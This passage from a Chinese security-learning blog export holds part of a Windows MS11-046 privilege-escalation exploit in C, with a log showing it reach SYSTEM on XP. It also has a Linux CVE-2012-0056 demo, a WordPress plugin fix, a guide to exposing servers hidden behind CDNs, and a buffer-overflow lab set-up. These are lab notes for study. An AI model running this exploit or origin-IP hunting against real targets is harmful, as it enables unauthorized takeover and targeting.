&#123;</span><br><span class="line">            <span class="comment">// AFD socket connect request successful</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;      [+] Done\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// in case of ERROR_NOACCESS</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(errorCode == <span class="number">998</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// AFD socket connect request unsuccessful - target is patched</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;      [!] Target patched\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;         [*] Possible security patches\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; securityPatchesCount; i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;            [*] %s\n&quot;</span>, securityPatchesPtr[i]);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// in case of any other error message</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// print the error code</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;      [-] Failed (error code: %d)\n&quot;</span>, errorCode);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// elevate privileges of the current process</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      [*] Elevating privileges to SYSTEM\n&quot;</span>);</span><br><span class="line">    ULONG outInterval = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProfile%2FNtQueryIntervalProfile.html</span></span><br><span class="line">    NtQueryIntervalProfile(<span class="number">2</span>, &amp;outInterval);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;         [+] Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// spawn shell (with elevated privileges)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;         [*] Spawning shell\n&quot;</span>);</span><br><span class="line">    <span class="comment">// spawn SYSTEM shell within the current shell (remote shell friendly)</span></span><br><span class="line">    system (<span class="string">&quot;c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// clean up and exit</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[*] Exiting SYSTEM shell\n&quot;</span>);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EoF</span></span><br></pre></td></tr></table></figure>
<p><strong>将代码编译成 exe 即可，个人用的是codeblock编译的</strong></p>
<p><strong>报错解决：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215170314261-1779689695.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215170534082-1385706214.png" /></p>
<p><strong>XP测试</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\a&gt;<span class="built_in">whoami</span></span><br><span class="line">DH-CA8822AB9589\a</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\a&gt;net user a</span><br><span class="line">User name                    a</span><br><span class="line">Full Name</span><br><span class="line">Comment</span><br><span class="line">User<span class="string">&#x27;s comment</span></span><br><span class="line"><span class="string">Country code                 000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            2/14/2022 10:20 PM</span></span><br><span class="line"><span class="string">Password expires             3/29/2022 9:07 PM</span></span><br><span class="line"><span class="string">Password changeable          2/14/2022 10:20 PM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory</span></span><br><span class="line"><span class="string">Last logon                   2/15/2022 5:09 PM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      *Users</span></span><br><span class="line"><span class="string">Global Group memberships     *None</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\Documents and Settings\a&gt;cd Desktop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\Documents and Settings\a\Desktop&gt;test.exe</span></span><br><span class="line"><span class="string">[*] MS11-046 (CVE-2011-1249) x86 exploit</span></span><br><span class="line"><span class="string">   [*] by Tomislav Paskalev</span></span><br><span class="line"><span class="string">[*] Identifying OS</span></span><br><span class="line"><span class="string">   [+] 32-bit</span></span><br><span class="line"><span class="string">   [+] Windows XP SP3</span></span><br><span class="line"><span class="string">[*] Locating required OS components</span></span><br><span class="line"><span class="string">   [+] ntkrnlpa.exe</span></span><br><span class="line"><span class="string">      [*] Address:      0x804d7000</span></span><br><span class="line"><span class="string">      [*] Offset:       0x00a70000</span></span><br><span class="line"><span class="string">      [+] HalDispatchTable</span></span><br><span class="line"><span class="string">         [*] Offset:    0x00ade838</span></span><br><span class="line"><span class="string">   [+] NtQueryIntervalProfile</span></span><br><span class="line"><span class="string">      [*] Address:      0x7c90d820</span></span><br><span class="line"><span class="string">   [+] ZwDeviceIoControlFile</span></span><br><span class="line"><span class="string">      [*] Address:      0x7c90d260</span></span><br><span class="line"><span class="string">[*] Setting up exploitation prerequisite</span></span><br><span class="line"><span class="string">   [*] Initialising Winsock DLL</span></span><br><span class="line"><span class="string">      [+] Done</span></span><br><span class="line"><span class="string">      [*] Creating socket</span></span><br><span class="line"><span class="string">         [+] Done</span></span><br><span class="line"><span class="string">         [*] Connecting to closed port</span></span><br><span class="line"><span class="string">            [+] Done</span></span><br><span class="line"><span class="string">[*] Creating token stealing shellcode</span></span><br><span class="line"><span class="string">   [*] Shellcode assembled</span></span><br><span class="line"><span class="string">   [*] Allocating memory</span></span><br><span class="line"><span class="string">      [+] Address:      0x02070000</span></span><br><span class="line"><span class="string">      [*] Shellcode copied</span></span><br><span class="line"><span class="string">[*] Exploiting vulnerability</span></span><br><span class="line"><span class="string">   [*] Sending AFD socket connect request</span></span><br><span class="line"><span class="string">      [+] Done</span></span><br><span class="line"><span class="string">      [*] Elevating privileges to SYSTEM</span></span><br><span class="line"><span class="string">         [+] Done</span></span><br><span class="line"><span class="string">         [*] Spawning shell</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\WINDOWS\system32&gt;whoami　　　　 #提权成功！</span></span><br><span class="line"><span class="string">NT AUTHORITY\SYSTEM</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215171204065-343305943.png" /></p>
<p><strong>提权成功！</strong></p>
<h2 id="ms14-068漏洞演示">3. Ms14-068漏洞演示</h2>
<p><strong>参见：<a
href="https://www.cnblogs.com/z9m8r8/articles/15922332.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/15922332.html</a></strong></p>
<h2 id="linux下提权cev-2012-0056-演示"><strong>4.
Linux下提权（CEV-2012-0056 演示）</strong></h2>
<p><strong>漏洞详解</strong></p>
<p><strong><a href="https://git.zx2c4.com/CVE-2012-0056/about/"
class="uri">https://git.zx2c4.com/CVE-2012-0056/about/</a></strong></p>
<p><strong><a href="https://www.jb51.net/LINUXjishu/56997.html"
class="uri">https://www.jb51.net/LINUXjishu/56997.html</a></strong></p>
<p><strong><a href="https://www.cve.org/CVERecord?id=CVE-2012-0056"
class="uri">https://www.cve.org/CVERecord?id=CVE-2012-0056</a></strong></p>
<p><strong>Ubuntu11.10</strong></p>
<p><a
href="http://old-releases.ubuntu.com/releases/11.10/ubuntu-11.10-desktop-amd64.iso"
class="uri">http://old-releases.ubuntu.com/releases/11.10/ubuntu-11.10-desktop-amd64.iso</a></p>
<p><strong>渗透代码</strong></p>
<p><strong><a href="https://www.exploit-db.com/exploits/35161"
class="uri">https://www.exploit-db.com/exploits/35161</a></strong></p>
<p><strong>演示：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220225175414215-1202091326.png" /></p>
<p><strong>注意：</strong> 由于Ubuntu 11.10
已不再维护，所以安装软件时找不到包，可通过挂载光盘（.iso）安装已集成到ISO中的旧版软件，也可单独下载软件包安装（如deb包），但此时可能需要安装更多的依赖包
/ 库，可依据提示安装即可！</p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount /dev/cdrom /media/cdrom </span><br><span class="line">sudo apt-cdrom add   <span class="comment">#添加到更新源</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>禁用 WP 插件方法</title>
    <url>/2023/03/12/%E7%A6%81%E7%94%A8-wp-%E6%8F%92%E4%BB%B6%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近因为一次意外配置导致wp无法登录了……以下是针对wp插件配置出现问题导致无法登录访问wp仪表盘的情况下的解决方法。</p>
<p>1、数据库备份解决</p>
<p>如果有数据库定时备份的话，可以直接将临插件配置出问题之前最近的一份导入数据库来恢复。这种方法恢复后我们可能需要做一些重复性的配置任务，可行但不太推荐。</p>
<p>2、磁盘快照</p>
<p>略……</p>
<p>3、通过 phpmyadmin 从数据库中禁用 WP 插件</p>
<p>这种方法只是将插件禁用了，之前作的配置依旧在，禁用后登录仪表盘只需将出问题的地方改下，重新启用插件即可，操作方法如下：</p>
<p>使用 phpmyadmin 访问 wp数据库，找到站点对应 wp_options
表（表的前缀可能不一样，取决于安全配置），在该表中找到active_plugins
行，在右侧，可以看到该行包含的部分值，继续单击编辑，接着将看到字段option_value中包含所有活动插件的字符串。将需要禁用的插件字符串删掉即可。</p>
<p>注意，在进行任何更改之前，应该将整个字符串复制保存下，以防出现问题后恢复。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过 CDN 获取真实IP</title>
    <url>/2023/08/20/%E7%BB%95%E8%BF%87-cdn-%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9Eip/</url>
    <content><![CDATA[<h2 id="cdn-基本介绍">1. CDN 基本介绍</h2>
<ul>
<li><a
href="https://worktile.com/kb/p/30328">https://worktile.com/kb/p/30328</a></li>
<li><a
href="https://baijiahao.baidu.com/s?id=1749733400277641855&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1749733400277641855&amp;wfr=spider&amp;for=pc</a></li>
</ul>
<h3 id="基本概念">1.1. 基本概念</h3>
<p>CDN的全称是Content Delivery
Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
<h3 id="技术原理">1.2. 技术原理</h3>
<ul>
<li>用户向浏览器提供要访问网站的域名，域名解析的请求被发往本地用户使用的DNS服务器，本地DNS服务器将解析请求转发至网站的DNS服务器(NS)；</li>
<li>由于网站的DNS服务器(NS)对此域名的解析设置了CNAME，请求最终被指向到CDN网络中的GLB系统;</li>
<li>GLB系统对域名进行智能解析，将响应速度最快的节点IP返回给用户;</li>
<li>浏览器在得到实际的IP地址以后，向CDN节点发出访问请求;</li>
<li>由于是第一次访问，CDN节点将回到源站获得用户请求的数据并发给用户，同时CDN节点根据缓存策略对该数据进行缓存;</li>
<li>当有其他用户再次访问同样内容时，CDN节点直接将数据返回给客户，完成请求/服务过程。</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/%E5%9B%BE1.1%20CDN%20%E6%8A%80%E6%9C%AF%E6%A1%86%E6%9E%B6.png"
alt="图1.1 CDN 技术框架.png" />
<figcaption aria-hidden="true">图1.1 CDN 技术框架.png</figcaption>
</figure>
<h2 id="查询真实-ip">2. 查询真实 IP</h2>
<ul>
<li><strong>原文链接：</strong><a
href="https://www.wangan.com/p/7fy7f6d0b4d1aeaf">https://www.wangan.com/p/7fy7f6d0b4d1aeaf</a></li>
</ul>
<h3 id="判断是否使用了-cdn">2.1. 判断是否使用了 CDN</h3>
<h4 id="pingpingping">2.1.1. PingPingPing</h4>
<p>不同地区对应着不同的 CDN 中心，所以使用不同站点的 ping
服务可分配到不同的 CDN。这很简单，使用各种多站点 ping 服务来检查对应的
IP 地址是否唯一。如果不是唯一的，则使用大多数 CDN。多站 Ping
网站为：</p>
<ul>
<li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></li>
<li><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></li>
<li><a
href="http://tools.ipip.net/ping.php">http://tools.ipip.net/ping.php</a>
【推荐】</li>
<li><a href="https://www.17ce.com/">https://www.17ce.com/</a></li>
</ul>
<h4 id="nslookup">2.1.2. nslookup</h4>
<p>使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP
地址多半是使用了 CDN。</p>
<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&gt;</span> <span class="string">ctfking.com</span></span><br><span class="line"><span class="attribute">服务器</span><span class="punctuation">:</span> <span class="string"> public1.alidns.com</span></span><br><span class="line"><span class="attribute">Address</span><span class="punctuation">:</span> <span class="string"> 223.5.5.5</span></span><br><span class="line"><span class="attribute">非权威应答</span><span class="punctuation">:</span></span><br><span class="line"><span class="attribute">名称</span><span class="punctuation">:</span> <span class="string">   d831e3eec87f7d3c02a6-mini-l2.qcloudzygj.com</span></span><br><span class="line"><span class="attribute">Addresses</span><span class="punctuation">:</span> <span class="string"> 106.55.85.170</span></span><br><span class="line">          <span class="attribute">106.55.85.167</span></span><br><span class="line"><span class="attribute">          106.55.86.71</span></span><br><span class="line"><span class="attribute">Aliases</span><span class="punctuation">:</span> <span class="string"> ctfking.com</span></span><br><span class="line">          d14ca549ac628ef817e7beaa5095976f.qcloudwzgj.com</span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">&gt; nbufe<span class="selector-class">.edu</span><span class="selector-class">.cn</span> </span><br><span class="line">服务器:  public1<span class="selector-class">.alidns</span><span class="selector-class">.com</span> </span><br><span class="line">Address:  <span class="number">223.5</span>.<span class="number">5.5</span> </span><br><span class="line">名称:    nbufe<span class="selector-class">.edu</span>.cn</span><br></pre></td></tr></table></figure>
<h4 id="工具">2.1.3. <strong>工具</strong></h4>
<ul>
<li>CDN Finder</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/%E5%9B%BE%202.1%20CDN%20Finder%E7%A4%BA%E4%BE%8B.png"
alt="图 2.1 CDN Finder示例.png" />
<figcaption aria-hidden="true">图 2.1 CDN Finder示例.png</figcaption>
</figure>
<h3 id="cdn-绕过">2.2. CDN 绕过</h3>
<h4 id="查询-dns-解析记录">2.2.1. 查询 DNS 解析记录</h4>
<p>（1）查看 IP 与域名绑定的历史记录。使用 CDN
之前可能有记录。相关查询网站为：</p>
<ul>
<li><a
href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></li>
<li><a
href="https://x.threatbook.com/">https://x.threatbook.com/</a></li>
<li><a
href="https://www.netcraft.com/tools/">https://www.netcraft.com/tools/</a></li>
<li><a href="https://www.ipip.net/">https://www.ipip.net/</a></li>
</ul>
<p>（2）借助 Securitytrails 平台（<a
href="https://securitytrails.com/">https://securitytrails.com/</a>）</p>
<p>攻击者可以查明真实的原始 IP。他们只需在搜索字段中输入站点域名并按
ENTER，即可在左侧菜单中找到 “历史数据”。</p>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/%E5%9B%BE%202.2%20Securitytrails%20%E7%A4%BA%E4%BE%8B.png"
alt="图 2.2 Securitytrails 示例.png" />
<figcaption aria-hidden="true">图 2.2 Securitytrails
示例.png</figcaption>
</figure>
<p>如何找到隐藏在 CloudFlare 或 Tor 背后的真实原始 IP？</p>
<p>除了过去的 DNS 记录，即使是当前的记录也可能泄露原始服务器
IP。例如，MX 记录是查找 IP 的常用方法。如果网站在与 Web 相同的服务器和
IP 上托管自己的邮件服务器，则原始服务器 IP 将在 MX 记录中。</p>
<h4 id="查询子域名">2.2.2. 查询子域名</h4>
<p>毕竟 CDN 还是不便宜，所以很多站长可能只会在主站或者流量大的子站做一个
CDN，而很多小站子站跟主站在同一个服务器或者同 C
段，此时可以通过子域对应的 IP 查询，帮助找到真实 IP 站点。</p>
<ul>
<li><a
href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></li>
</ul>
<p>只需要输入 baidu.com TYPE:A 就可以收集到百度的子域名和 IP。</p>
<ul>
<li><a
href="https://x.threatbook.com/">https://x.threatbook.com/</a></li>
</ul>
<p>只需输入域名即可查找（如
baidu.com），点击子域选项即可找到其子域，<strong>但免费用户每月只有 5
次免费查询机会。</strong></p>
<ul>
<li><a href="https://www.google.com/">Google</a></li>
</ul>
<p>谷歌站点：baidu.com-www 可以看到除 WWW 以外的子域</p>
<ul>
<li>子域扫描器</li>
</ul>
<p>用于子域名检测的工具主要有<strong>Layer子域名挖掘机</strong>、K8、wydomain、<strong>Sublist3r</strong>、dnsmaper、<strong>subDomainsBrute</strong>、MaltegoCE等。</p>
<h4 id="网络空间引擎">2.2.3. 网络空间引擎</h4>
<ul>
<li><a href="https://fofa.info/">https://fofa.info/</a></li>
<li><a
href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></li>
<li><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></li>
<li><a href="https://www.shodan.io/">https://www.shodan.io/</a></li>
<li><a
href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a></li>
</ul>
<p>推荐鹰图，只需输入：title:“网站的 title 关键字” 或者 body：“网站的
body 特征” 就可以找出收录的有这些关键字的 ip
域名，很多时候能获取网站的真实 ip</p>
<h4 id="使用-ssl-证书寻找真实原-ip">2.2.4. 使用 SSL 证书寻找真实原
IP</h4>
<p>如果您在 xyz123boot.com 上托管服务，则原始服务器 IP 为
136.23.63.44。CloudFlare 将为您提供 DDoS 防护、Web
应用防火墙和其他一些安全服务，以保护您的服务免受攻击。为此，您的 Web
服务器必须支持 SSL 并具有证书。此时，CloudFlare
与您的服务器之间的通信，就像您与 CloudFlare
之间的通信一样，将被加密（即没有灵活的
SSL）。这看起来很安全，但问题是当你直接连接到 443 端口（<a
href="https://136.23.63.44:443">https://136.23.63.44:443</a>）上的 IP
时，会暴露 SSL 证书。</p>
<p>此时，如果攻击者扫描 0.0.0.0/0，整个互联网，就可以在 xyz123boot.com
的 443 端口获取有效证书，进而获取提供给你的 web 服务器 IP。</p>
<ul>
<li><a
href="https://search.censys.io/">https://search.censys.io/</a></li>
</ul>
<p>目前，Censys 工具可以扫描整个互联网。Censys
是用于搜索联网设备信息的新搜索引擎。安全专家可以使用它来评估其实施的安全性，黑客可以使用它作为初步调查。攻击目标和收集目标信息的强大武器。Censys
搜索引擎可以扫描整个互联网。Censys 每天扫描 IPv4
地址空间，搜索所有联网设备并收集相关信息，并返回资源（如设备、网站、证书等）配置和部署的整体报告。</p>
<p>攻击者唯一需要做的就是将上述搜索词转换为实际的搜索查询参数。</p>
<p>example.com 证书的搜索查询参数为：names: example.com</p>
<p>只显示有效证书的查询参数为：tags.raw:trusted</p>
<p>攻击者可以在 Censys
上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
<p>组合的搜索参数是：names: example.com 和 tags.raw：trusted</p>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/%E5%9B%BE%202.3%20Censys%20%E7%A4%BA%E4%BE%8B-1.png"
alt="图 2.3 Censys 示例-1.png" />
<figcaption aria-hidden="true">图 2.3 Censys 示例-1.png</figcaption>
</figure>
<p>Censys 将向您显示在扫描中找到的符合上述搜索条件的所有标准证书。</p>
<p>要查看这些搜索结果，攻击者可以通过单击右侧的 “探索”
来打开一个包含多个工具的下拉菜单。什么在使用这个证书？&gt; IPv4 主机</p>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/%E5%9B%BE%202.4%20Censys%20%E7%A4%BA%E4%BE%8B-2.png"
alt="图 2.4 Censys 示例-2.png" />
<figcaption aria-hidden="true">图 2.4 Censys 示例-2.png</figcaption>
</figure>
<p>使用给定的 SSL 证书</p>
<p>如果您是执法人员，并且想找到隐藏在 cheesecp5vaogohv.onion
下的儿童色情网站。最好的办法是找到它的原始
IP，这样就可以追踪它的托管服务器，甚至可以找出它背后的运营商和财务线索。</p>
<p>隐藏服务具有 SSL 证书。要查找它使用的 IPv4 主机，只需将 “SHA1
指纹”（签名证书的 sha1 值）粘贴到 Censys IPv4
主机搜索中即可找到证书。这种方法很容易找到配置错误的 Web 服务器。</p>
<h4 id="使用-http-头找到真正的原始-ip">2.2.5. 使用 HTTP 头找到真正的原始
IP</h4>
<p>借助 SecurityTrails
这样的平台，任何人都可以在海量的大数据中搜索自己的目标，甚至可以通过比较
HTTP 标头找到原始服务器。</p>
<p>特别是当用户有一个非常特殊的服务器名称和软件名称时，攻击者更容易找到你。</p>
<p>如果要搜索的数据很多，如上所述，攻击者可以在 Censys
上组合搜索参数。假设您正在与 1500 个 Web 服务器共享您的服务器 HTTP
标头，所有这些服务器都发送相同的标头参数和值组合。而且您还使用新的 PHP
框架来发送唯一的 HTTP 标头（例如：X-Generated-Via: XYZ 框架），目前约有
400
位网站管理员使用该框架。最终，在三台服务器的交汇处，通过人工操作即可找到
IP，整个过程仅需几秒。</p>
<p>例如，Censys 上用于匹配服务器头的搜索参数为
80.http.get.headers.server:，查找 CloudFlare 服务的网站的参数如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">80</span><span class="selector-class">.http</span><span class="selector-class">.get</span><span class="selector-class">.headers</span><span class="selector-class">.server</span>:cloudflare</span><br></pre></td></tr></table></figure>
<h4 id="利用网站返回的内容寻找真实的原-ip">2.2.6.
利用网站返回的内容寻找真实的原 IP</h4>
<p>如果原服务器 IP 也返回网站内容，可以在网上搜索很多相关资料。</p>
<p>浏览网站源代码以查找独特的代码片段。在 JavaScript
中使用具有访问权限或标识符参数的第三方服务（例如 Google
Analytics、reCAPTCHA）是攻击者经常使用的一种方法。</p>
<p>以下是从 HackTheBox 网站获得的 Google Analytics 跟踪代码示例：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">ga (&#x27; 创建 &#x27;,&#x27;UA-<span class="number">93577176</span>-1&#x27;,&#x27;auto&#x27;);</span><br></pre></td></tr></table></figure>
<p>80.http.get.body 可以使用：参数通过 body/source 过滤 Censys
数据。不幸的是，普通搜索字段有局限性。但是您可以在 Censys
请求研究访问权限，这使您可以通过 Google BigQuery 进行更强大的查询。</p>
<p>Shodan 是一个类似于 Censys 的服务，同样提供 http.html 搜索参数。</p>
<p>搜索示例：<a
href="https://www.shodan.io/search?query=http.html%3AUA-32023260-1">https://www.shodan.io/search?query=http.html%3AUA-32023260-1</a></p>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/%E5%9B%BE%202.5%20shodan%20%E7%A4%BA%E4%BE%8B.png"
alt="图 2.5 shodan 示例.png" />
<figcaption aria-hidden="true">图 2.5 shodan 示例.png</figcaption>
</figure>
<h4 id="使用外地主机解析域名">2.2.7. 使用外地主机解析域名</h4>
<p>国内很多 CDN
厂商因为各种原因只做国内线，国外线路可能几乎没有。这时候我们可能会使用外地主机直接访问真实
IP。</p>
<h4 id="网站漏洞搜索">2.2.8. 网站漏洞搜索</h4>
<ul>
<li>目标敏感文件泄露，如 phpinfo、GitHub 信息泄露等探针</li>
<li>XSS 盲打、命令执行反向 shell、SSRF 等</li>
<li>无论是社会工程还是其他手段，目标网站获取 CDN 中的管理员账号，在 CDN
的配置中可以找到网站的真实 IP。</li>
</ul>
<h4 id="网站邮件订阅搜索">2.2.9. 网站邮件订阅搜索</h4>
<p>RSS 邮件订阅，很多网站都有自己的
sendmail，会发邮件给我们。此时，服务器的真实 IP
将包含在邮件的源代码中。</p>
<h4 id="用-zmap-扫描全网">2.2.10. 用 Zmap 扫描全网</h4>
<p>要找到 xiaix.me 网站的真实 IP，我们首先从 apnic 获取 IP 段，然后使用
Zmap 的 banner-grab 扫描出开放 80 端口的主机进行 banner 抓包，最后在
Host 中写入 xiaix.me http 请求。</p>
<h4 id="f5-ltm-解码方法">2.2.11. F5 LTM 解码方法</h4>
<p>服务器使用 F5 LTM 进行负载均衡时，也可以通过 set-cookie
关键字解码得到真实 ip，例如：Set-Cookie:
BIGipServerpool_8.29_8030=487098378.24095.0000，第一个小数部分的十进制数是
487098378 取出来，然后转换成十六进制数
1d08880a，然后从后往前，取出四位数字，就是
0a.88.08.1d，最后再转换成十进制数10.136.8.29，也是最后一个真实 IP。</p>
<h4 id="网页敏感信息">2.2.12. 网页敏感信息</h4>
<p>这条思路来源于 Jacko</p>
<p>（1）favicon 哈希值，根据网站图标哈希值搜索 IP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;https://example.com/favicon.ico&#x27;</span>)</span><br><span class="line">favicon = response.content.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;http.favicon.hash:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hash</span>)</span><br></pre></td></tr></table></figure>
<p>去 fofa 或者 shodan 上搜索该哈希值</p>
<ul>
<li>查询格式：</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">fofa：icon_hash=<span class="string">&quot;xxx&quot;</span></span><br><span class="line">shodan：http<span class="selector-class">.favicon</span><span class="selector-class">.hash</span>:xxx</span><br></pre></td></tr></table></figure>
<p>（2）HTML 源代码检索查找 IP</p>
<p>根据网站页面 HTML 中特有的字符串去搜索引擎中搜索，如目标页面中由 HTML
标签为 的字段比较特殊，那么可以去FOFA中搜索：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">title</span><span class="operator">=</span><span class="string">&quot;xxxxxxxxxxxxxxx&quot;</span></span><br></pre></td></tr></table></figure>
<p>搜索到的结果会显示IP，访问该IP，若能够正常访问则为真正IP，如果打不开则为CDN或虚拟主机服务器</p>
<h4 id="app-抓包">2.2.13. APP 抓包</h4>
<p>如果目标网站有自己的App，可以尝试利用Fiddler或BurpSuite抓取App的请求，从里面找到目标的真实IP。</p>
<h3 id="参考文章">2.3. 参考文章</h3>
<ul>
<li><a
href="https://www.wolai.com/3xXwCoP1KEgkWWG8bnnian">https://www.wolai.com/3xXwCoP1KEgkWWG8bnnian</a></li>
<li><a
href="https://www.codetd.com/en/article/12945130">https://www.codetd.com/en/article/12945130</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区溢出之LINUX实例 </title>
    <url>/2022/01/31/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B9%8BLINUX%E5%AE%9E%E4%BE%8B/</url>
    <content><![CDATA[<h2 id="实验环境">1. 实验环境</h2>
<p><strong>• Crossfire</strong></p>
<p>• 多人在线RPG 游戏</p>
<p><strong>• 1.9.0 版本接受入站 socket
连接时存在缓冲区溢出漏洞</strong></p>
<p>• 下载：<a href="http://www.offensive-security.com/crossfire.tar.gz"
class="uri">http://www.offensive-security.com/crossfire.tar.gz</a></p>
<p><strong>• 调试工具</strong></p>
<p><strong>• edb（kali自带）</strong></p>
<p><strong>• 运行平台</strong></p>
<p><strong>• Kali i486 虚拟机</strong></p>
<p>• 下载：&lt;https://kali.download/virtual-images/kali-2021.4a/kali-
linux-2021.4a-vmware-i386.7z&gt;</p>
<p><strong>• 环境搭建及测试</strong></p>
<p><strong>将 crossfire.tar.gz解压到 /usr/games/
目录下即可，运行测试如下图：</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220130140122094-1359024584.png" /></strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220130140310113-1470166043.png" /></p>
